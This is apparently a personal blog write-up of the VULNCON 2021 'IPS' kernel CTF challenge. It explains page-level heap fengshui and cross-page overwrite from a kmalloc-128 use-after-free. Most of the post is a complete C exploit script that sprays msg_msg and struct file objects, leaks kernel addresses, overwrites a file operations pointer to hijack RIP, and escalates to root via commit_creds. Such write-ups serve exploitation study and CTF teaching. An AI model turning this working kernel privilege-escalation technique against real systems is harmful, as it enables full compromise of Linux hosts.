---
title: "Learn Kernel Heap Cross Page Overwrite and Page Level Fengshui from a CTF challenge: IPS(VULNCON 2021)"
date: 2024-02-29 20:42:29
tags: 
layout: default
---

# 0xFF tl;dr

I learned this skill from this [article][1]. This article is shitty since I wrote three write-ups for the same challenge. I just document what's new so it's not for other readers. I recommend you to read Kyle's original [post][1]. Thanks @Kyle for the write-up!

# 0x00 Challenge

The attachment is available [here][5].

I analyzed the challenge and introduced related skills in this [article][2]. In that article, I used `msg_msg` to walk through different slabs and leak the target slab address then use arbitrary free to over write the function pointers. However, that method is kind of verbose. If we know some kernel heap fengshui, things gonna be much easier.

# 0x01 Exploitation


In this challenge we have UAF for kmalloc-128 and want to attack the objects on another slab, for example kmalloc-256. If we have a kmalloc-256 page just after kmalloc-128 page, we can free a fake chunk at the end of kmalloc-128 page and overwrite the first object on kmalloc-256, which is a very juicy pattern for exploitation. However, how can we make it happen? 

There are more comprehensive analysis of page level fengshui in this [article][3]. But to make life easier, I only introduce the facts we need in this challenge.

- When we run out of objects of curren slab, slab will use budysystem to allocate new pages
- When we run out of pages for one specific order, budysystem gonna borrow connected pages from higher order and split them to lower order.


Based on the two facts listed, we can do following steps to create such a patter that a kmalloc-128 page is next to a kmalloc-256 page.

- Drain 0x80 slab so slab allocator has to borrow from budysystem and budyststem has to borrow from higher order
- Allocte the vulnerable 0x80 object.
- Likly, the next page (of the page where vulnerable obejct locates) is still in budystsystem
- Drain 0x100 slab to get the next page.
- Arbitrary Free the fake chunk at the end of the page before the vulnerable page
- Refill and overflow


# 0x02 Leak & Attack

If we want to make leaking and attacking easier, we'd better select some obejcts including a pointer points to the same page where it is and some kernel text pointers so we can leak kernel text. Moreover, it should also include function pointers or a pointer to function pointer table so we can hijack RIP. 

Considering the requirements above, `struct file` is a good candidate.

We can leak kernel.text and current page's addresses if we can leak its content. Also, we can ovewrite the `fop` pointer to hijack RIP. 


# 0x03 Exploitation Script

```python
// https://github.com/n132/libx/tree/main
#include "libx.h"
#if defined(LIBX)
    size_t user_cs, user_ss, user_rflags, user_sp;
    void saveStatus()
    {
        __asm__("mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                );
        printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
    }
    size_t back2root = shell;
    void back2userImp(){
        __asm__("mov rax, user_ss;"
            "push rax;"
            "mov rax, user_sp;"
            "push rax;"
            "mov rax, user_rflags;"
            "push rax;"
            "mov rax, user_cs;"
            "push rax;"
            "mov rax, back2root;"
            "push rax;"
            "swapgs;"
            "push 0;"
            "popfq;"
            "iretq;"
            );
    }
    void libxInit(){
        back2user = back2userImp;
        hook_segfault();
        saveStatus();
    }
#endif // 
#define ISP 548
typedef struct {
  int idx;
  unsigned short priority;
  char *data;} dt;
void add(char *buf, int priority){
    dt dt;
    dt.priority = priority;
    dt.data = buf;
    return syscall(ISP,1,&dt);
}
void del(int idx){
    dt dt;
    dt.idx = idx;
    return syscall(ISP,2,&dt);
}
void edit(int idx, char *buf){
    dt dt;
    dt.idx = idx;
    dt.data = buf;
    return syscall(ISP,3,&dt);

}
void copy(int idx){
    dt dt;
    dt.idx = idx;
    return syscall(ISP,4,&dt);
}
int main()
{   
    libxInit();
    // Drain 0x80
    msgSpray(0x50,0x10000/0x80,"Spray");
    add("0",0);
    // Drain 0x100
    int fds[0x200] = {0};
    for(int i = 0 ; i< 0x200 ; i++)
        fds[i] = open("/etc/passwd",0);
    
    for(int i = 1 ; i< 0x10; i++)
        add(str(i),i);
    copy(0);
    int msgid = msgGet();
    del(0);
    //Refill
    msgSend(msgid,"A",0x50);
    edit(-1,dpn('\xff',14,18));
    int msgid2 = msgGet();
    msgMsg* msg = msgRecv(msgid,0x1000);
    msgSend(msgid2,"B",0x50); // refill
    size_t * ptr  = msg->mtext;
    size_t faker = 0;
    size_t kernel = 0;
    for(int i = 3 ; i < 0x200-1 ; i++){
        // info(ptr[i]);

        if(0x000a801d00008000 == ptr[i]){
            kernel = ptr[i-3];
            faker = ptr[i+3] - 0x58-0x50;
            break;
        }        
    }
    if(!kernel || !faker)
        panic("Failed to Leak");
    info(kernel);
    info(faker);
    edit(-1,strcat(dpn('\xff',18,18+8),p64(faker)));
    msgid =  msgGet();
    
    size_t * fake_op = 0xdeadbeef000;
    char *pay = strcat(dpn('\xff',0xfd0+0x70,0xfd0+0x78),p64(fake_op+0x10));


    msgRecv(msgid2,1);
    msgSend(msgid,pay,0xfd0+0x78);
    
    mmapx(fake_op,0x1000);

    commit_creds = kernel - (0xffffffff82029500 - 0xffffffff8108a830);
    prepare_kernel_cred = kernel - ( 0xffffffff82029500 - 0xffffffff8108aad0);
    for(int i = 0 ; i < 0x200;i++)
        fake_op[i] = getRootPrivilige;

    debug();
    for(int i = 0 ; i<0x200; i ++)
        close(fds[i]);
}
```

# 0x04 Epilogue

Learned a new technique for kernel heap. 

Btw, struct file is so good. 
Cross Page Overwrite is also amazing!
Not sure if this heap fengshui skill is generic. I'll update if I got the answer.


[1]: https://blog.kylebot.net/2022/01/10/VULNCON-2021-IPS/#Exploitation
[2]: https://n132.github.io/2024/02/09/IPS.html
[3]: https://etenal.me/archives/1825
[5]: https://github.com/sajjadium/ctf-archives/tree/0328b950496e5d12b775e8bd67d1569977ec10c0/ctfs/VULNCON/2021/pwn/ips